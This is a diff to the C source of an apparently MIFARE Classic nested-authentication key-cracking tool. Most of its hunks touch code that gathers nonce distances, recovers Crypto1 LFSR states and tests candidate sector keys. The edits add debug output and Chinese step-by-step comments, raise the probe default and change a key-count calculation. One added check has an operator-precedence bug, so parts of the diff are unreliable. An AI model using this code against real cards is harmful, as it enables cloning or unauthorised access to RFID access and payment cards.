@@ -552,7 +552,7 @@ int main(int argc, char *const argv[])
                 return 9;
           }
 
-          printf("Sector: %d, type %c, probe %d, distance %d ", j, (dumpKeysA ? 'A' : 'B'), k, d.median);
+          printf("\nSector: %d, type %c, probe %d, distance %d \n", j, (dumpKeysA ? 'A' : 'B'), k, d.median);
           // Configure device to the previous state
           mf_configure(r.pdi);
           mf_anticollision(t, r);
@@ -565,17 +565,30 @@ int main(int argc, char *const argv[])
             mf_enhanced_auth(e_sector, t.sectors[j].trailer, t, r, &d, pk, 'r', dumpKeysA);
             mf_configure(r.pdi);
             mf_anticollision(t, r);
-            fprintf(stdout, ".");
+            // fprintf(stdout, ".");
             fflush(stdout);
           }
           fprintf(stdout, "\n");
+
           // Get first 15 grouped keys
           ck = uniqsort(pk->possibleKeys, pk->size);
+
+          for (i = 0; i < 5; i++)
+            if (ck[i].count > 0)
+              fprintf(stdout,"size %d try %d/%d count=%d key=%llx  top 5\n", pk->size, i+1, TRY_KEYS, ck[i].count, ck[i].key);
+          fprintf(stdout, "\n");
+          for (i = 0; i < pk->size; i++)
+            if (ck[i].count != sets) {
+              fprintf(stdout,"size %d try %d count=%d key=%llx   count < sets\n", pk->size, i+1, ck[i].count, ck[i].key);
+              break;
+            }
+          fprintf(stdout, "\n");
+
           for (i = 0; i < TRY_KEYS ; i++) {
             // We don't known this key, try to break it
             // This key can be found here two or more times
             if (ck[i].count > 0) {
-              // fprintf(stdout,"%d %llx\n",ck[i].count, ck[i].key);
+              fprintf(stdout,"size %d try %d/%d count=%d key=%llx\n", pk->size, i+1, TRY_KEYS, ck[i].count, ck[i].key);
               // Set required authetication method
               num_to_bytes(ck[i].key, 6, mp.mpa.abtKey);
               mc = dumpKeysA ? MC_AUTH_A : MC_AUTH_B;
@@ -633,6 +646,7 @@ int main(int argc, char *const argv[])
               }
             }
           }
+          fprintf(stdout, "\n");
           free(pk->possibleKeys);
           free(ck);
           // Success, try the next sector
@@ -659,7 +673,7 @@ int main(int argc, char *const argv[])
 
   if (succeed) {
     i = t.num_sectors; // Sector counter
-    fprintf(stdout, "Auth with all sectors succeeded, dumping keys to a file!\n");
+    fprintf(stdout, "\nAuth with all sectors succeeded, dumping keys to a file!\n");
     // Read all blocks
     for (block = t.num_blocks; block >= 0; block--) {
       trailer_block(block) ? i-- : i;
@@ -763,7 +777,7 @@ void usage(FILE *stream, int errno)
   fprintf(stream, "  f     parses a file of keys to add in addition to the default keys \n");    
 //    fprintf(stream, "  D     number of distance probes, default is 20\n");
 //    fprintf(stream, "  S     number of sets with keystreams, default is 5\n");
-  fprintf(stream, "  P     number of probes per sector, instead of default of 20\n");
+  fprintf(stream, "  P     number of probes per sector, instead of default of 150\n");
   fprintf(stream, "  T     nonce tolerance half-range, instead of default of 20\n        (i.e., 40 for the total range, in both directions)\n");
 //    fprintf(stream, "  s     specify the list of sectors to crack, for example -s 0,1,3,5\n");
   fprintf(stream, "  O     file in which the card contents will be written (REQUIRED)\n");
@@ -860,7 +874,7 @@ int find_exploit_sector(mftag t)
   }
   for (i = 0; i < t.num_sectors; i++) {
     if ((t.sectors[i].foundKeyA) || (t.sectors[i].foundKeyB)) {
-      fprintf(stdout, "\n\nUsing sector %02d as an exploit sector\n", i);
+      fprintf(stdout, "\nUsing sector %02d as an exploit sector\n\n", i);
       return i;
     }
   }
@@ -921,7 +935,7 @@ get_rats_is_2k(mftag t, mfreader r)
 
 int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d, pKeys *pk, char mode, bool dumpKeysA)
 {
-  struct Crypto1State *pcs;
+  struct Crypto1State *pcs, *pcskk;
   struct Crypto1State *revstate;
   struct Crypto1State *revstate_start;
 
@@ -941,7 +955,7 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
   uint8_t Rx[MAX_FRAME_LEN]; // Tag response
   uint8_t RxPar[MAX_FRAME_LEN]; // Tag response
 
-  uint32_t Nt, NtLast, NtProbe, NtEnc, Ks1;
+  uint32_t Nt, NtLast, NtProbe, NtEnc, Ks1, tmp;
 
   int i;
   uint32_t m;
@@ -965,6 +979,7 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
     exit(EXIT_FAILURE);
   }
 
+// step1: 读卡器请求auth
   if (nfc_initiator_transceive_bytes(r.pdi, Auth, 4, Rx, sizeof(Rx), 0) < 0) {
     fprintf(stdout, "Error while requesting plain tag-nonce\n");
     exit(EXIT_FAILURE);
@@ -974,10 +989,13 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
     nfc_perror(r.pdi, "nfc_device_set_property_bool");
     exit(EXIT_FAILURE);
   }
+// step2: ic卡返回Nt
+  // fprintf(stdout, "rx:\t");
   // print_hex(Rx, 4);
 
   // Save the tag nonce (Nt)
   Nt = bytes_to_num(Rx, 4);
+  // fprintf(stdout, "Nt:\t%lu\n", Nt);
 
   // Init the cipher with key {0..47} bits
   if (t.sectors[e_sector].foundKeyA) {
@@ -989,6 +1007,7 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
   // Load (plain) uid^nt into the cipher {48..79} bits
   crypto1_word(pcs, bytes_to_num(Rx, 4) ^ t.authuid, 0);
 
+// step3.1: 读卡器随机Nr
   // Generate (encrypted) nr+parity by loading it into the cipher
   for (i = 0; i < 4; i++) {
     // Load in, and encrypt the reader nonce (Nr)
@@ -998,6 +1017,7 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
   // Skip 32 bits in the pseudo random generator
   Nt = prng_successor(Nt, 32);
   // Generate reader-answer from tag-nonce
+// step3.2 读卡器计算Ar
   for (i = 4; i < 8; i++) {
     // Get the next random byte
     Nt = prng_successor(Nt, 8);
@@ -1021,9 +1041,10 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
     exit(EXIT_FAILURE);
   }
 
+// step4: 读卡器验证At
   // Now print the answer from the tag
   // fprintf(stdout, "\t{At}:\t");
-  // print_hex_par(Rx,RxLen,RxPar);
+  // print_hex_par(Rx,64,RxPar);
 
   // Decrypt the tag answer and verify that suc3(Nt) is At
   Nt = prng_successor(Nt, 32);
@@ -1033,10 +1054,11 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
   }
   // fprintf(stdout, "Authentication completed.\n\n");
 
+// 用已知的key去收集ic卡两次随机数的"距离"
   // If we are in "Get Distances" mode
   if (mode == 'd') {
-    for (m = 0; m < d->num_distances; m++) {
-      // fprintf(stdout, "Nested Auth number: %x: ,", m);
+    for (m = 0; m < d->num_distances; m++) {	// 收集次数
+       fprintf(stdout, "Nested Auth number: %x: ", m);
       // Encrypt Auth command with the current keystream
       for (i = 0; i < 4; i++) {
         AuthEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ Auth[i];
@@ -1044,6 +1066,7 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
         AuthEncPar[i] = filter(pcs->odd) ^ oddparity(Auth[i]);
       }
 
+// step1: 读卡器请求auth
       // Sending the encrypted Auth command
       if (nfc_initiator_transceive_bits(r.pdi, AuthEnc, 32, AuthEncPar, Rx, sizeof(Rx), RxPar) < 0) {
         fprintf(stdout, "Error requesting encrypted tag-nonce\n");
@@ -1056,6 +1079,7 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
       } else {
         pcs = crypto1_create(bytes_to_num(t.sectors[e_sector].KeyB, 6));
       }
+// step2: ic卡返回Nt
       NtLast = bytes_to_num(Rx, 4) ^ crypto1_word(pcs, bytes_to_num(Rx, 4) ^ t.authuid, 1);
 
       // Make sure the card is using the known PRNG
@@ -1066,13 +1090,19 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
       // Save the determined nonces distance
       d->distances[m] = nonce_distance(Nt, NtLast);
 
+      fprintf(stdout, "rx:\t");
+      print_hex(Rx, 4);
+      printf("authuid=%u Nt=%u NtLast=%u  distance = %u\n", t.authuid, Nt, NtLast, d->distances[m]);
+
+// step3.1: 读卡器随机Nr
       // Again, prepare and send {At}
-      for (i = 0; i < 4; i++) {
+      for (i = 0; i < 4; i++) {	// 0-4 Nr
         ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
         ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
       }
       Nt = prng_successor(NtLast, 32);
-      for (i = 4; i < 8; i++) {
+// step3.2: 读卡器计算Ar
+      for (i = 4; i < 8; i++) {	// 4-8 Ar
         Nt = prng_successor(Nt, 8);
         ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^(Nt & 0xFF);
         ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
@@ -1082,6 +1112,7 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
         ERR("Reader-answer transfer error, exiting..");
         exit(EXIT_FAILURE);
       }
+// step4: 读卡器验证At
       Nt = prng_successor(Nt, 32);
       if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt & 0xFFFFFFFF))) {
         ERR("[At] is not Suc3(Nt), something is wrong, exiting..");
@@ -1091,7 +1122,7 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
 
     // Find median from all distances
     d->median = median(*d);
-    //fprintf(stdout, "Median: %05d\n", d->median);
+    fprintf(stdout, "\nMedian: %d\n", d->median);
   } // The end of Get Distances mode
 
   // If we are in "Get Recovery" mode
@@ -1101,6 +1132,7 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
     Auth[1] = a_sector;
     iso14443a_crc_append(Auth, 2);
 
+// step1: 读卡器对未知块请求auth
     // Encryption of the Auth command, sending the Auth command
     for (i = 0; i < 4; i++) {
       AuthEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ Auth[i];
@@ -1123,22 +1155,28 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
       exit(EXIT_FAILURE);
     }
 
+// 收到未知块加密的Nt
     // Save the encrypted nonce
     NtEnc = bytes_to_num(Rx, 4);
+    // fprintf(stdout, "\nrx enc:\t");
+    // print_hex(Rx, 4);
+    printf("\n收到未知块加密的Nt NtEnc = %u %x\n", NtEnc, NtEnc);
 
     // Parity validity check
     for (i = 0; i < 3; ++i) {
       d->parity[i] = (oddparity(Rx[i]) != RxPar[i]);
     }
 
+// 猜测随机数的步数，枚举 [d->median - d->tolerance, d->median + d->tolerance] 的可能性, 得到可能的Ntprobe
     // Iterate over Nt-x, Nt+x
-    // fprintf(stdout, "Iterate from %d to %d\n", d->median-TOLERANCE, d->median+TOLERANCE);
+    fprintf(stdout, "Iterate from %d to %d, Nt0 = %u\n", d->median - d->tolerance, d->median + d->tolerance, Nt);
     NtProbe = prng_successor(Nt, d->median - d->tolerance);
     for (m = d->median - d->tolerance; m <= d->median + d->tolerance; m += 2) {
 
       // Try to recover the keystream1
       Ks1 = NtEnc ^ NtProbe;
 
+// 计算可能得key? 看不懂
       // Skip this nonce after invalid 3b parity check
       revstate_start = NULL;
       if (valid_nonce(NtProbe, NtEnc, Ks1, d->parity)) {
@@ -1160,12 +1198,19 @@ int mf_enhanced_auth(int e_sector, int a_sector, mftag t, mfreader r, denonce *d
               exit(EXIT_FAILURE);
             }
           }
+          // 所有 lfsr + NtProbe 都能算出 NtEnc
+          pcskk = crypto1_create(lfsr);
+          tmp = crypto1_word(pcskk, NtProbe ^ t.authuid, 0);
+          if (tmp ^ NtProbe != NtEnc)
+              printf("m=%d kcount=%d lfsr=%lx \t NtProbe=%u %x Ks1=%x t.authuid=%x tmp=%x 正算得到NtEnc=%x NtEnc=%x\n", m, kcount, lfsr, NtProbe, NtProbe, Ks1, t.authuid, tmp, tmp ^ NtProbe, NtEnc);
+
           pk->possibleKeys[kcount] = lfsr;
           kcount++;
           revstate++;
         }
         free(revstate_start);
       }
+// 尝试下一个可能的NtProbe
       NtProbe = prng_successor(NtProbe, 2);
     }
     // Truncate
@@ -1228,7 +1273,7 @@ countKeys *uniqsort(uint64_t *possibleKeys, uint32_t size)
       count++;
     } else {
       our_counts[j].key = possibleKeys[i];
-      our_counts[j].count = count;
+      our_counts[j].count = count + 1;
       j++;
       count = 0;
     }
